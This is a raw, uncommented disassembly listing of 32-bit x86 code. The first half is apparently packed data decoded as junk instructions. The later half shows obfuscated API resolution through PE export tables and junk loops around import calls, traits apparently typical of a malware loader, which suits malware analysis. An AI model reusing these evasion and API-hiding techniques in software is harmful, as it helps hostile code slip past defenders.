  40ff7e:	mov    edx,0xdbdddda6
  40ff83:	add    bl,BYTE PTR [ecx+0x7e]
  40ff86:	(bad)  
  40ff87:	in     al,0x2a
  40ff89:	jge    0x40ff21
  40ff8b:	dec    ecx
  40ff8c:	add    eax,0x70e3ded5
  40ff91:	ror    BYTE PTR [ebp+0x35],1
  40ff94:	aam    0xf1
  40ff96:	scas   al,BYTE PTR es:[edi]
  40ff97:	jmp    0x40ff6f
  40ff99:	in     eax,0x5a
  40ff9b:	sbb    BYTE PTR ds:0x6d0d6679,bl
  40ffa1:	nop
  40ffa2:	xchg   ebx,eax
  40ffa3:	ret    
  40ffa4:	inc    eax
  40ffa5:	cmp    ecx,DWORD PTR [edx+0x54]
  40ffa8:	pop    ds
  40ffa9:	jmp    0xe748:0x2dfd2c47
  40ffb0:	aas    
  40ffb1:	cld    
  40ffb2:	push   ecx
  40ffb3:	test   DWORD PTR [edi+0x3edde147],ecx
  40ffb9:	call   0xe8f9:0xf28de35e
  40ffc0:	jns    0x40ffca
  40ffc2:	xor    DWORD PTR [edi],0x22
  40ffc5:	mov    DWORD PTR [edx-0x62],esi
  40ffc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffc9:	das    
  40ffca:	mov    al,ds:0x908a14a2
  40ffcf:	lods   al,BYTE PTR ds:[esi]
  40ffd0:	aam    0x95
  40ffd2:	hlt    
  40ffd3:	xor    DWORD PTR [ecx],esi
  40ffd5:	fdivr  DWORD PTR [ebx-0xa]
  40ffd8:	shl    BYTE PTR [edx],1
  40ffda:	test   BYTE PTR [ebx+0x4e463e28],cl
  40ffe0:	fwait
  40ffe1:	repnz in al,dx
  40ffe3:	mov    ebx,0x43a43c4
  40ffe8:	outs   dx,DWORD PTR ds:[esi]
  40ffe9:	fst    DWORD PTR [esi-0x5e88c55f]
  40ffef:	clc    
  40fff0:	nop
  40fff1:	xchg   BYTE PTR [eax],dl
  40fff3:	inc    ecx
  40fff4:	test   eax,0xd060652e
  40fff9:	xchg   ebp,eax
  40fffa:	mov    bh,0x61
  40fffc:	hlt    
  40fffd:	dec    ecx
  40fffe:	ret    
  40ffff:	int3   
  410000:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410001:	sbb    edx,DWORD PTR [esi+0xe2ba8e3]
  410007:	mov    al,0x9d
  410009:	cmp    bl,bh
  41000b:	mov    cx,0xa21a
  41000f:	adc    al,0x86
  410011:	adc    al,0x44
  410013:	pop    es
  410014:	sbb    edi,ebp
  410016:	adc    DWORD PTR [esi+edi*2],0xffffffa8
  41001a:	je     0x410056
  41001c:	and    ch,bl
  41001e:	jle    0x410082
  410020:	mov    dh,0x3
  410022:	mov    edi,0x9a68e5bb
  410027:	stos   DWORD PTR es:[edi],eax
  410028:	cdq    
  410029:	and    al,0x81
  41002b:	inc    esi
  41002c:	mov    eax,ds:0x1b368cef
  410031:	fdiv   QWORD PTR [ecx]
  410033:	cmp    DWORD PTR [ecx+0x56],edi
  410036:	(bad)  
  410037:	sbb    eax,0xab31c0bc
  41003c:	sub    ch,BYTE PTR [esi+ebp*2]
  41003f:	inc    esi
  410040:	bound  ebp,QWORD PTR [edi-0x15c0a574]
  410046:	cmp    ebx,DWORD PTR [ecx-0x2c8a935d]
  41004c:	jecxz  0x4100b1
  41004e:	push   esi
  41004f:	icebp  
  410050:	int3   
  410051:	cmc    
  410052:	xor    dh,ch
  410054:	xor    BYTE PTR [eax+0x2e],cl
  410057:	test   al,0x32
  410059:	fdivr  DWORD PTR [edx-0x41]
  41005c:	jns    0x410033
  41005e:	fmulp  st(5),st
  410060:	inc    esp
  410061:	(bad)  
  410062:	in     al,0x53
  410064:	cs inc edx
  410066:	sbb    DWORD PTR [esi+0x1c],esp
  410069:	nop    ebp
  41006c:	popa   
  41006d:	or     ebp,DWORD PTR [eax-0x67a158da]
  410073:	xor    edx,DWORD PTR [ebx+0x32]
  410076:	adc    DWORD PTR [ebx+ebp*1],ebx
  410079:	mov    ebp,0xe9a7f226
  41007e:	mov    ecx,0x74d132da
  410083:	int3   
  410084:	jo     0x410016
  410086:	rol    bh,0x57
  410089:	push   edi
  41008a:	adc    eax,0xa17bdb6
  41008f:	aam    0x1
  410091:	daa    
  410092:	sub    ah,BYTE PTR [edi+0x39]
  410095:	arpl   WORD PTR [ebx-0x37],sp
  410098:	and    DWORD PTR [ebp+0x3d],esp
  41009b:	add    al,0xcd
  41009d:	pop    ebx
  41009e:	mov    ebx,0xd08f3106
  4100a3:	cmp    ebp,DWORD PTR [ecx-0x7b]
  4100a6:	ss pop ax
  4100a9:	leave  
  4100aa:	cmp    al,0x98
  4100ac:	push   edx
  4100ad:	addr16 cmc 
  4100af:	mov    ds:0xf6d5c9b8,al
  4100b4:	(bad)
  4100b7:	lock jmp 0xa0f5:0xd6baea1e
  4100bf:	mov    ?,WORD PTR ds:0x311555fe
  4100c5:	es gs leave 
  4100c8:	sub    ecx,eax
  4100ca:	out    0x15,al
  4100cc:	hlt    
  4100cd:	test   eax,0x6cb1fb66
  4100d2:	dec    ebx
  4100d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100d4:	cmp    bh,BYTE PTR [ecx+eiz*8-0x6817ce6b]
  4100db:	inc    ebx
  4100dc:	ins    BYTE PTR es:[edi],dx
  4100dd:	(bad)  
  4100de:	addr16 push esp
  4100e0:	daa    
  4100e1:	and    edx,DWORD PTR [eax+0x547acaa7]
  4100e7:	inc    eax
  4100e8:	sti    
  4100e9:	xchg   edi,eax
  4100ea:	sti    
  4100eb:	ss cmp edx,ebx
  4100ee:	adc    DWORD PTR [ecx],edx
  4100f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100f1:	outs   dx,DWORD PTR ds:[esi]
  4100f2:	fcomi  st,st(6)
  4100f4:	jmp    0x7672:0x24a4185b
  4100fb:	lahf   
  4100fc:	push   ecx
  4100fd:	add    esi,DWORD PTR [ebp-0x609e02f]
  410103:	in     al,dx
  410104:	mov    al,dl
  410106:	dec    eax
  410107:	ficom  DWORD PTR [eax+0x14]
  41010a:	xchg   esi,eax
  41010b:	jge    0x410155
  41010d:	xor    al,al
  41010f:	int3   
  410110:	sbb    al,0x77
  410112:	outs   dx,BYTE PTR ds:[esi]
  410113:	fnsave [ebx]
  410115:	and    al,0xad
  410117:	mov    dl,0xe9
  410119:	mov    ch,0x79
  41011b:	js     0x4100ea
  41011d:	into   
  41011e:	xor    al,0xeb
  410120:	xchg   edx,eax
  410121:	enter  0xaec8,0xa8
  410125:	or     BYTE PTR [edi],dh
  410127:	inc    edi
  410128:	pop    ebp
  410129:	(bad)  
  41012a:	out    0xe3,eax
  41012c:	inc    edi
  41012d:	loop   0x4100e0
  41012f:	mov    ah,0x2b
  410131:	mov    bl,0xac
  410133:	imul   esi,DWORD PTR [ecx-0x69],0x953ba583
  41013a:	rcr    DWORD PTR ds:0x65df5e0f,cl
  410140:	mov    esi,edx
  410142:	sar    BYTE PTR [esi+0x326b74ce],1
  410148:	mov    ebx,0xdcfb3e4
  41014d:	mov    esp,0x789ceda0
  410152:	cmp    dh,BYTE PTR [edi+0x3732c565]
  410158:	fldcw  WORD PTR [ecx+ecx*4]
  41015b:	mov    ecx,0x4eb524cf
  410160:	pop    ecx
  410161:	test   eax,0xaafd0230
  410166:	(bad)  
  410167:	and    DWORD PTR [eax+esi*8-0xf],esi
  41016b:	xchg   esp,eax
  41016c:	ja     0x410101
  41016e:	sbb    al,0x4f
  410170:	int    0x3
  410172:	sub    ecx,DWORD PTR [ecx+0x3b]
  410175:	sub    BYTE PTR [edx+0x6f085c41],0xb2
  41017c:	or     BYTE PTR [edx],dl
  41017e:	mov    ebx,0x6afd053f
  410183:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410184:	scas   al,BYTE PTR es:[edi]
  410185:	and    edi,ebx
  410187:	jbe    0x41018c
  410189:	stc    
  41018a:	ja     0x410121
  41018c:	sar    DWORD PTR [ebp+0x7b],1
  41018f:	ret    0xf30a
  410192:	or     dl,BYTE PTR [ebx-0x10]
  410195:	adc    esp,DWORD PTR [edi-0x22b19c99]
  41019b:	rcl    BYTE PTR [edx+0x18a65ab6],0x3a
  4101a2:	adc    eax,0x7ec4e469
  4101a7:	dec    eax
  4101a8:	sbb    esi,edi
  4101aa:	mov    ebp,0x7f6c5382
  4101af:	imul   ch
  4101b1:	fidiv  DWORD PTR [esi]
  4101b3:	push   ds
  4101b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101b5:	mov    ds:0x8470e6b9,eax
  4101ba:	lods   al,BYTE PTR ds:[esi]
  4101bb:	inc    esp
  4101bc:	push   ebx
  4101bd:	lods   al,BYTE PTR ds:[esi]
  4101be:	dec    ebx
  4101bf:	in     eax,dx
  4101c0:	in     al,dx
  4101c1:	(bad)  [eax-0x3cc2f7fd]
  4101c7:	dec    ecx
  4101c8:	or     eax,0x3133e2be
  4101cd:	fdiv   DWORD PTR [ecx+0x33b122f]
  4101d3:	jnp    0x4101a0
  4101d5:	sbb    DWORD PTR [esi-0x7d],ebp
  4101d8:	in     al,dx
  4101d9:	sbb    BYTE PTR [edi],ch
  4101db:	popa   
  4101dc:	inc    ebx
  4101dd:	mov    bh,0x4a
  4101df:	iret   
  4101e0:	loop   0x41023e
  4101e2:	jmp    0x7f8ba7c0
  4101e7:	mov    dl,0x47
  4101e9:	inc    ebx
  4101ea:	pop    esi
  4101eb:	repz jno 0x4101d3
  4101ee:	or     BYTE PTR [esi-0x9],dh
  4101f1:	cmp    DWORD PTR [eax],esp
  4101f3:	jp     0x410229
  4101f5:	xchg   BYTE PTR ds:0x5c12dbc9,bh
  4101fb:	call   0x57e7:0xa6e21342
  410202:	sti    
  410203:	fild   DWORD PTR [eax+0x58]
  410206:	cmp    BYTE PTR [esi+0x53],ah
  410209:	and    DWORD PTR [eax-0x5],0x9429e855
  410210:	das    
  410211:	mov    edi,0xa92c4c12
  410216:	imul   ebp,DWORD PTR [esi+edx*2+0x147cf655],0x833bb70d
  410221:	push   edi
  410222:	hlt    
  410223:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410224:	jae    0x410261
  410226:	(bad)  
  410227:	dec    ecx
  410228:	maxps  xmm7,xmm7
  41022b:	mov    bh,0xf0
  41022d:	sbb    ecx,DWORD PTR [esi]
  41022f:	popf   
  410230:	cmp    ebx,0x23ae34c6
  410236:	jnp    0x4102ab
  410238:	sar    DWORD PTR [ebp-0x59],0x9d
  41023c:	adc    esp,ecx
  41023e:	test   DWORD PTR [ebx+0x5b],esi
  410241:	sub    ebp,DWORD PTR [edi+eax*1]
  410244:	outs   dx,DWORD PTR ds:[esi]
  410245:	ins    BYTE PTR es:[edi],dx
  410246:	jl     0x410263
  410248:	sbb    esp,DWORD PTR [eax+0x5f55f4e1]
  41024e:	jmp    0x7fc25845
  410253:	cmc    
  410254:	adc    esp,DWORD PTR [ebx+0x44]
  410257:	mov    ebx,0xd376dd2f
  41025c:	fdiv   QWORD PTR [ebx]
  41025e:	fsubrp st(6),st
  410260:	push   ebp
  410261:	dec    ebx
  410262:	cs adc al,0x82
  410265:	add    al,0x0
  410267:	add    DWORD PTR [ebx-0x50641bb4],edi
  41026d:	gs popa 
  41026f:	jmp    0x410241
  410271:	push   ecx
  410272:	ss pop ss
  410274:	mov    ds:0x99669517,eax
  410279:	rcl    DWORD PTR [eax-0x2ce186ca],cl
  41027f:	repz cmp edi,0xc5a67fb8
  410286:	pusha  
  410287:	add    edi,DWORD PTR [ecx-0x20]
  41028a:	loop   0x41027c
  41028c:	je     0x4102a9
  41028e:	retf   
  41028f:	mov    ah,0xa5
  410291:	xchg   edx,eax
  410292:	imul   ebx,ebx,0x44
  410295:	cmp    ch,cl
  410297:	dec    edi
  410298:	xchg   esi,eax
  410299:	mov    DWORD PTR [esp+eax*1],esi
  41029c:	xchg   esi,eax
  41029d:	jl     0x4102ff
  41029f:	scas   eax,DWORD PTR es:[edi]
  4102a0:	jmp    FWORD PTR [edx+0x38]
  4102a3:	stos   BYTE PTR es:[edi],al
  4102a4:	loop   0x410313
  4102a6:	pop    ds
  4102a7:	add    DWORD PTR [edi],0xe526c468
  4102ad:	push   ds
  4102ae:	add    eax,edx
  4102b0:	(bad)  
  4102b1:	f2xm1  
  4102b3:	mov    al,0x3f
  4102b5:	jg     0x41031a
  4102b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102b8:	in     eax,0x27
  4102ba:	cmp    DWORD PTR [edi],ebp
  4102bc:	mov    eax,DWORD PTR [edi]
  4102be:	test   DWORD PTR [edi+0x65],edx
  4102c1:	xor    edx,DWORD PTR [ebp+0x7e]
  4102c4:	add    al,0x70
  4102c6:	sbb    eax,0x25719960
  4102cb:	sbb    al,0x6a
  4102cd:	cmp    bl,BYTE PTR [ebx-0x4a]
  4102d0:	push   esp
  4102d1:	inc    eax
  4102d2:	outs   dx,BYTE PTR ds:[esi]
  4102d3:	cli    
  4102d4:	mov    ah,0xc4
  4102d6:	outs   dx,BYTE PTR ds:[esi]
  4102d7:	cli    
  4102d8:	xor    al,0xed
  4102da:	enter  0x5113,0x33
  4102de:	sub    ebp,esp
  4102e0:	push   cs
  4102e1:	retf   
  4102e2:	loope  0x410302
  4102e4:	cmp    ah,BYTE PTR [ecx]
  4102e6:	xor    BYTE PTR [ecx+0x79164357],dl
  4102ec:	jae    0x410355
  4102ee:	ficom  DWORD PTR [ebp-0x7b]
  4102f1:	xchg   ebx,eax
  4102f2:	xor    al,0x81
  4102f4:	das    
  4102f5:	sub    al,0x1e
  4102f7:	jno    0x410307
  4102f9:	aas    
  4102fa:	xchg   esp,eax
  4102fb:	cmp    DWORD PTR [eax],ebx
  4102fd:	mov    esi,DWORD PTR [esi-0x2e]
  410300:	mov    bh,0x14
  410302:	push   eax
  410303:	mov    ecx,0x9d410ef0
  410308:	xchg   DWORD PTR [esi+esi*1],ecx
  41030b:	rcl    BYTE PTR [ebp+0x2e],1
  41030e:	outs   dx,DWORD PTR gs:[esi]
  410310:	in     eax,dx
  410311:	or     ch,0x41
  410314:	jecxz  0x41036b
  410316:	adc    edi,DWORD PTR [eax+0x66ffda6c]
  41031c:	xor    dh,BYTE PTR [edi]
  41031e:	inc    DWORD PTR ds:0x8111af05
  410324:	add    edx,DWORD PTR [esi]
  410326:	cmp    eax,0xd707f19a
  41032b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41032c:	or     eax,0x9e1362a9
  410331:	arpl   WORD PTR ds:0xf1057043,bx
  410337:	cmp    BYTE PTR [eax+ebx*4+0x7757d2d5],0x5f
  41033f:	jle    0x4103a9
  410341:	(bad)  
  410342:	clc    
  410343:	cmp    eax,0x52d171a6
  410348:	mov    eax,ds:0xe2e2a470
  41034d:	fwait
  41034e:	xor    DWORD PTR [eax+0x7bfecbe7],0xffffffd7
  410355:	xchg   ecx,eax
  410356:	or     esi,eax
  410358:	jbe    0x4103b1
  41035a:	imul   edx,DWORD PTR [eax-0x2d],0xffffffa9
  41035e:	dec    esi
  41035f:	xchg   ebx,eax
  410360:	inc    eax
  410361:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410362:	xor    BYTE PTR [ecx],dh
  410364:	scas   al,BYTE PTR es:[edi]
  410365:	adc    al,0xe5
  410367:	cmp    al,dh
  410369:	(bad)  
  41036a:	and    DWORD PTR [edx+0x3b4bbbc1],0x0
  410371:	add    BYTE PTR [esi+0x2b],ah
  410374:	sti    
  410375:	mov    ebx,0x8a85
  41037a:	xor    di,bx
  41037d:	mov    ebx,0x4f8a
  410382:	cmp    di,bx
  410385:	jne    0x4103ad
  41038b:	movsx  di,BYTE PTR [eax]
  41038f:	mov    ebx,0x3b4b
  410394:	sub    di,bx
  410397:	mov    ebx,0x8a85
  41039c:	xor    di,bx
  41039f:	mov    ebx,0x4f87
  4103a4:	cmp    di,bx
  4103a7:	je     0x4103bd
  4103ad:	mov    edi,DWORD PTR [ebp-0x10]
  4103b0:	xor    edi,ecx
  4103b2:	mov    ebx,esi
  4103b4:	sub    ebx,edi
  4103b6:	add    eax,ebx
  4103b8:	jmp    0x40dfbd
  4103bd:	mov    esi,DWORD PTR [ebp-0x14]
  4103c0:	mov    esi,DWORD PTR [esi]
  4103c2:	mov    edi,DWORD PTR [eax+0x3c]
  4103c5:	lea    esi,[edi+esi*8+0x78]
  4103c9:	mov    esi,DWORD PTR [esi+eax*1]
  4103cc:	mov    DWORD PTR [ebp-0x8],esi
  4103cf:	mov    esi,DWORD PTR [ebp+0x8]
  4103d2:	xor    esi,ecx
  4103d4:	add    esi,edx
  4103d6:	mov    DWORD PTR [ebp-0x14],esi
  4103d9:	mov    esi,DWORD PTR [ebp+0x8]
  4103dc:	mov    edi,DWORD PTR [ebp-0x8]
  4103df:	xor    esi,ecx
  4103e1:	add    esi,edx
  4103e3:	pop    ebx
  4103e4:	cmp    edi,esi
  4103e6:	jne    0x410404
  4103ec:	mov    eax,DWORD PTR [ebp+0xc]
  4103ef:	xor    eax,ecx
  4103f1:	mov    ecx,DWORD PTR [ebp-0x8]
  4103f4:	add    eax,edx
  4103f6:	imul   eax,ecx
  4103f9:	mov    DWORD PTR [ebp-0x8],eax
  4103fc:	push   DWORD PTR [ebp+0x18]
  4103ff:	jmp    0x410458
  410404:	mov    ecx,DWORD PTR [ebp-0x8]
  410407:	add    ecx,eax
  410409:	mov    DWORD PTR [ebp-0x14],ecx
  41040c:	mov    ecx,DWORD PTR [ebp-0x14]
  41040f:	mov    ecx,DWORD PTR [ecx+0xc]
  410412:	movsx  cx,BYTE PTR [ecx+eax*1]
  410417:	mov    edx,0x3b4b
  41041c:	sub    cx,dx
  41041f:	mov    edx,0x8a85
  410424:	xor    cx,dx
  410427:	mov    edx,0x4f85
  41042c:	cmp    cx,dx
  41042f:	jne    0x4103fc
  410435:	mov    ecx,DWORD PTR ds:0x41e0ec
  41043b:	mov    ecx,DWORD PTR [ecx+0x198]
  410441:	mov    DWORD PTR [ecx],eax
  410443:	jmp    0x410469
  410448:	mov    ecx,DWORD PTR [ebp+0x18]
  41044b:	cmp    ecx,0xf89c85b5
  410451:	jne    0x410469
  410457:	push   eax
  410458:	push   DWORD PTR [ebp+0x14]
  41045b:	push   DWORD PTR [ebp+0x10]
  41045e:	push   DWORD PTR [ebp+0xc]
  410461:	push   DWORD PTR [ebp+0x8]
  410464:	call   0x40b7a6
  410469:	pop    edi
  41046a:	pop    esi
  41046b:	leave  
  41046c:	ret    0x14
  41046f:	push   ebp
  410470:	mov    ebp,esp
  410472:	sub    esp,0x48
  410475:	and    DWORD PTR ds:0x431018,0x0
  41047f:	mov    eax,ds:0x431018
  410484:	inc    eax
  410485:	mov    ds:0x431018,eax
  41048a:	cmp    DWORD PTR ds:0x431018,0xc
  410491:	jne    0x4104a6
  410497:	push   DWORD PTR [ebp-0xc]
  41049a:	push   DWORD PTR [ebp-0xc]
  41049d:	push   DWORD PTR [ebp-0x28]
  4104a0:	call   DWORD PTR ds:0x42b028
  4104a6:	cmp    DWORD PTR ds:0x431018,0xb
  4104ad:	jne    0x4104be
  4104b3:	mov    eax,ds:0x431018
  4104b8:	inc    eax
  4104b9:	mov    ds:0x431018,eax
  4104be:	cmp    DWORD PTR ds:0x431018,0x1f
  4104c5:	jb     0x41047f
  4104cb:	adc    DWORD PTR ds:0x432010,ebx
  4104d1:	push   ebx
  4104d2:	mov    DWORD PTR ds:0x430010,0x1e
  4104dc:	cmp    DWORD PTR ds:0x430010,0x0
  4104e3:	je     0x410526
  4104e9:	cmp    DWORD PTR ds:0x430010,0x26
  4104f0:	jne    0x410501
  4104f6:	push   0x4246c2
  4104fb:	call   DWORD PTR ds:0x42b02c
  410501:	xor    eax,eax
  410503:	xor    eax,DWORD PTR ds:0x430010
  410509:	dec    eax
  41050a:	mov    ds:0x430010,eax
  41050f:	jmp    0x4104dc
  410514:	movzx  eax,WORD PTR ds:0x431014
  41051b:	sub    eax,DWORD PTR ds:0x430004
  410521:	mov    ds:0x431014,eax
  410526:	push   esi
  410527:	push   edi
  410528:	and    DWORD PTR ds:0x432000,0x0
  410532:	jmp    0x410544
  410537:	mov    edi,DWORD PTR ds:0x432000
  41053d:	inc    edi
  41053e:	mov    DWORD PTR ds:0x432000,edi
  410544:	cmp    DWORD PTR ds:0x432000,0x1e
  41054b:	jae    0x410597
  410551:	cmp    DWORD PTR ds:0x432000,0x1f
  410558:	jne    0x41058c
  41055e:	push   DWORD PTR [ebp-0x28]
  410561:	push   0x3d00
  410566:	push   0x5480
  41056b:	push   DWORD PTR [ebp-0x10]
  41056e:	push   DWORD PTR [ebp-0x24]
  410571:	push   DWORD PTR [ebp-0x1c]
  410574:	push   0x6187
  410579:	push   DWORD PTR [ebp-0x20]
  41057c:	push   0x5fd8
  410581:	push   0x12ef
  410586:	call   DWORD PTR ds:0x42b030
  41058c:	jmp    0x410537
  410591:	and    eax,DWORD PTR ds:0x430018
  410597:	xor    esi,esi
  410599:	and    DWORD PTR ds:0x432008,0x0
  4105a3:	jmp    0x4105b5
  4105a8:	mov    edi,DWORD PTR ds:0x432008
  4105ae:	inc    edi
  4105af:	mov    DWORD PTR ds:0x432008,edi
  4105b5:	cmp    DWORD PTR ds:0x432008,0x1e
  4105bc:	jae    0x4105ff
  4105c2:	cmp    DWORD PTR ds:0x432008,0xe
  4105c9:	jne    0x4105e0
  4105cf:	push   DWORD PTR [ebp-0x18]
  4105d2:	push   0x42f020
  4105d7:	push   DWORD PTR [ebp-0x28]
  4105da:	call   DWORD PTR ds:0x42b034
  4105e0:	cmp    DWORD PTR ds:0x432008,0xd
  4105e7:	jne    0x4105fa
  4105ed:	mov    edi,DWORD PTR ds:0x432008
  4105f3:	inc    edi
  4105f4:	mov    DWORD PTR ds:0x432008,edi
  4105fa:	jmp    0x4105a8
  4105ff:	mov    DWORD PTR [ebp-0x20],esi
  410602:	or     eax,edi
  410604:	mov    eax,DWORD PTR [ebp-0xc]
  410607:	push   0x21
  410609:	and    DWORD PTR ds:0x433004,edi
  41060f:	mov    DWORD PTR [ebp-0xc],eax
  410612:	add    edi,DWORD PTR ds:0x42f020
  410618:	pop    edi
  410619:	add    DWORD PTR ds:0x42f010,0x432010
  410623:	push   0x41e200
  410628:	call   DWORD PTR ds:0x42b040
  41062e:	push   esi
  41062f:	and    DWORD PTR ds:0x42f008,0x432018
  410639:	push   0x2
  41063b:	adc    DWORD PTR ds:0x42f018,0x432008
  410645:	push   0x1
  410647:	xor    DWORD PTR ds:0x433004,0x42f020
  410651:	push   0x2
  410653:	push   0x1
  410655:	add    DWORD PTR ds:0x43200c,0x158b
  41065f:	push   0x8678768
  410664:	push   0x87676776
  410669:	call   DWORD PTR ds:0x42b00c
  41066f:	xor    DWORD PTR ds:0x431014,0x433004
  410679:	push   esi
  41067a:	add    DWORD PTR ds:0x43001c,0x4e21
  410684:	push   0x68
  410686:	and    DWORD PTR ds:0x42f024,0x9b5
  410690:	push   0xd
  410692:	not    DWORD PTR ds:0x42f01c
  410698:	push   0x5
  41069a:	or     DWORD PTR ds:0x42f020,0x433010
  4106a4:	push   0x3
  4106a6:	push   0x5468787
  4106ab:	call   DWORD PTR ds:0x42b024
  4106b1:	dec    edi
  4106b2:	mov    DWORD PTR ds:0x42f010,0x709e
  4106bc:	jne    0x410619
  4106c2:	mov    eax,DWORD PTR [ebp-0xc]
  4106c5:	mov    DWORD PTR ds:0x42f000,edi
  4106cb:	mov    ebx,0xf89c85b6
  4106d0:	cmp    eax,ebx
  4106d2:	mov    DWORD PTR ds:0x430014,0x6187
  4106dc:	jne    0x4107d8
  4106e2:	or     DWORD PTR ds:0x430008,0x42f010
  4106ec:	mov    DWORD PTR ds:0x41e1fc,0xf89c85b5
  4106f6:	add    DWORD PTR ds:0x432014,0x8c5
  410700:	push   DWORD PTR [ebp+0x10]
  410703:	sbb    DWORD PTR ds:0x430004,0x430010
  41070d:	push   DWORD PTR [ebp+0xc]
  410710:	push   DWORD PTR [ebp+0x8]
  410713:	call   0x403cbf
  410718:	mov    DWORD PTR ds:0x430018,0x1f
  410722:	cmp    DWORD PTR ds:0x430018,0x0
  410729:	je     0x4107c2
  41072f:	cmp    DWORD PTR ds:0x430018,0xf
  410736:	jne    0x41074a
  41073c:	push   DWORD PTR [ebp-0x14]
  41073f:	push   0x348e
  410744:	call   DWORD PTR ds:0x42b038
  41074a:	cmp    DWORD PTR ds:0x430018,0x10
  410751:	jne    0x410764
  410757:	mov    edi,DWORD PTR ds:0x430018
  41075d:	dec    edi
  41075e:	mov    DWORD PTR ds:0x430018,edi
  410764:	mov    edi,DWORD PTR ds:0x430018
  41076a:	dec    edi
  41076b:	mov    DWORD PTR ds:0x430018,edi
  410771:	jmp    0x410722
  410776:	and    DWORD PTR ds:0x433004,0x0
  410780:	mov    esi,DWORD PTR ds:0x433004
  410786:	inc    esi
  410787:	mov    DWORD PTR ds:0x433004,esi
  41078d:	cmp    DWORD PTR ds:0x433004,0x1f
  410794:	jne    0x4107b5
  41079a:	push   0x55b4
  41079f:	push   DWORD PTR [ebp-0x14]
  4107a2:	push   0x43000c
  4107a7:	push   0x45b8
  4107ac:	push   DWORD PTR [ebp-0x28]
  4107af:	call   DWORD PTR ds:0x42b000
  4107b5:	cmp    DWORD PTR ds:0x433004,0x16
  4107bc:	jb     0x410780
  4107c2:	mov    ecx,DWORD PTR ds:0x41e0ec
  4107c8:	sub    esi,edi
  4107ca:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4107d0:	and    edi,0x3fae
  4107d6:	mov    DWORD PTR [ecx],eax
  4107d8:	or     edi,DWORD PTR ds:0x42f010
  4107de:	mov    DWORD PTR [ebp-0x4],ebx
  4107e1:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4107e8:	lea    eax,[ebp-0x28]
  4107eb:	xor    DWORD PTR ds:0x42f018,edx
  4107f1:	mov    DWORD PTR [ebp-0x20],eax
  4107f4:	sbb    edi,DWORD PTR ds:0x433010
  4107fa:	lea    eax,[ebp-0x2c]
  4107fd:	and    DWORD PTR ds:0x431014,0x0
  410807:	mov    edi,DWORD PTR ds:0x431014
  41080d:	inc    edi
  41080e:	mov    DWORD PTR ds:0x431014,edi
  410814:	cmp    DWORD PTR ds:0x431014,0x1d
  41081b:	jne    0x41082c
  410821:	push   0x45e3
  410826:	call   DWORD PTR ds:0x42b004
  41082c:	cmp    DWORD PTR ds:0x431014,0x1c
  410833:	jb     0x410807
  410839:	sbb    DWORD PTR ds:0x42f01c,edx
  41083f:	mov    DWORD PTR [ebp-0x1c],eax
  410842:	and    DWORD PTR ds:0x432010,0x0
  41084c:	mov    edi,DWORD PTR ds:0x432010
  410852:	inc    edi
  410853:	mov    DWORD PTR ds:0x432010,edi
  410859:	cmp    DWORD PTR ds:0x432010,0xd
  410860:	jne    0x410874
  410866:	push   0x4246f1
  41086b:	push   DWORD PTR [ebp-0xc]
  41086e:	call   DWORD PTR ds:0x42b008
  410874:	cmp    DWORD PTR ds:0x432010,0xc
  41087b:	jne    0x41088e
  410881:	mov    edi,DWORD PTR ds:0x432010
  410887:	inc    edi
  410888:	mov    DWORD PTR ds:0x432010,edi
  41088e:	cmp    DWORD PTR ds:0x432010,0x1b
  410895:	jb     0x41084c
  41089b:	and    edi,esi
  41089d:	mov    eax,ds:0x41e0ec
  4108a2:	sub    ecx,esi
  4108a4:	mov    eax,DWORD PTR [eax+0x1c8]
  4108aa:	mov    eax,DWORD PTR [eax]
  4108ac:	mov    ecx,DWORD PTR [ebp-0x1c]
  4108af:	not    edi
  4108b1:	mov    esi,0x7510893
  4108b6:	xor    eax,esi
  4108b8:	movzx  edi,BYTE PTR ds:0x42f028
  4108bf:	add    DWORD PTR ds:0x431018,edi
  4108c5:	mov    edi,0x3272db
  4108ca:	adc    DWORD PTR ds:0x43001c,0x42f018
  4108d4:	add    eax,edi
  4108d6:	mov    DWORD PTR ds:0x42f000,0x302d
  4108e0:	mov    DWORD PTR [ecx],eax
  4108e2:	mov    DWORD PTR ds:0x433010,ebx
  4108e8:	mov    eax,ds:0x41e2e8
  4108ed:	mov    DWORD PTR ds:0x431008,0x286e
  4108f7:	cmp    eax,0x301ac8f5
  4108fc:	jne    0x41095e
  410902:	and    DWORD PTR ds:0x431000,0x0
  41090c:	xor    eax,eax
  41090e:	or     eax,DWORD PTR ds:0x431000
  410914:	inc    eax
  410915:	mov    ds:0x431000,eax
  41091a:	cmp    DWORD PTR ds:0x431000,0x19
  410921:	jne    0x410930
  410927:	push   DWORD PTR [ebp-0x28]
  41092a:	call   DWORD PTR ds:0x42b048
  410930:	cmp    DWORD PTR ds:0x431000,0x17
  410937:	jb     0x41090c
  41093d:	mov    eax,DWORD PTR [ebp-0x4]
  410940:	mov    ecx,DWORD PTR ds:0x41e0ec
  410946:	mov    ecx,DWORD PTR [ecx+0x198]
  41094c:	xor    eax,esi
  41094e:	add    eax,edi
  410950:	mov    DWORD PTR [ecx],eax
  410952:	mov    eax,DWORD PTR [ebp-0x4]
  410955:	xor    eax,esi
  410957:	add    eax,edi
  410959:	mov    ds:0x41e2e8,eax
  41095e:	mov    eax,ds:0x41e0ec
  410963:	mov    eax,DWORD PTR [eax+0x18c]
  410969:	mov    eax,DWORD PTR [eax]
  41096b:	mov    DWORD PTR [ebp-0x30],eax
  41096e:	mov    eax,0xf89c85ba
  410973:	mov    DWORD PTR [ebp-0x1c],eax
  410976:	mov    DWORD PTR [ebp-0x1c],eax
  410979:	mov    DWORD PTR [ebp-0x1c],eax
  41097c:	mov    DWORD PTR [ebp-0x1c],ebx
  41097f:	mov    DWORD PTR [ebp-0x38],eax
  410982:	mov    DWORD PTR [ebp-0x38],0xf89c85be
